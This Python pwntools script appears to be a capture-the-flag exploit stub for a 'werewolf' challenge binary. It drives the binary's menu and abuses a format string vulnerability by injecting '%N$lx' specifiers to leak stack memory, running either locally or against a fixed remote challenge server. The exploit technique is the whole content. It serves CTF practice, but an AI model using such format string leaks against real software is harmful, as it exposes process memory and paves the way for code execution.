#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context.log_level = 'info'

fn = './werewolf.dbg'

# 格式化字符串漏洞

class Operator:
    def __init__(self, io):
        self.io = io
    
    def add(self, size, content):
        self.io.sendlineafter('Exit\n', '1')
        self.io.sendlineafter('size:\n', str(size))
        self.io.sendlineafter('action:\n', content)

    def show(self, idx):
        self.io.sendlineafter('Exit\n', '2')
        self.io.sendlineafter('id\n', str(idx))
        self.io.recvuntil('s action : ')
        data = self.io.recvuntil('===========')[:-12]
        return data
    
    def edit(self, idx, content):
        self.io.sendlineafter('Exit\n', '3')
        self.io.sendlineafter('id\n', str(idx))
        self.io.sendlineafter('action\n', content)

    def kill(self, idx):
        self.io.sendlineafter('Exit\n', '4')
        self.io.sendlineafter('id\n', str(idx))

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('106.75.72.91', 20000)

op = Operator(io)

op.add(256, '%p')

for i in xrange(0, 60):
    fmtstr = '%{}$lx'.format(i)
    op.edit(0, fmtstr)
    data = op.show(0)
    print i, data

io.interactive()
